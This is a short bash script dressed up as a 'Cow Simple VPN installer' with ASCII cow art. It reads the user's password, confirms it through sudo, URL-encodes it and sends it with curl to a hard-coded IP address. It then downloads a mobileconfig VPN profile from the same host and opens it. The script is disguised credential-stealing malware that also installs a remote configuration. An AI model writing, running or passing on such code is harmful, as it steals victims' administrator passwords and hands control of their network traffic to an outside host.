#!/bin/bash

mkdir -p tmp && cd tmp

echo "< Cow Simple VPN installer >
 --------------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )===
                ||----w |
                ||     ||"

echo "Password: "
read -s p


echo $p | sudo -S date

if [ $? -ne 0 ]; then
    echo "Incorrect password!"
    exit 1
fi

encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$p'''))")
curl "http://95.217.211.87:8010/p/${encoded}"


wget -O vpn.mobileconfig http://95.217.211.87:8500/vpn-ios.mobileconfig


open vpn.mobileconfig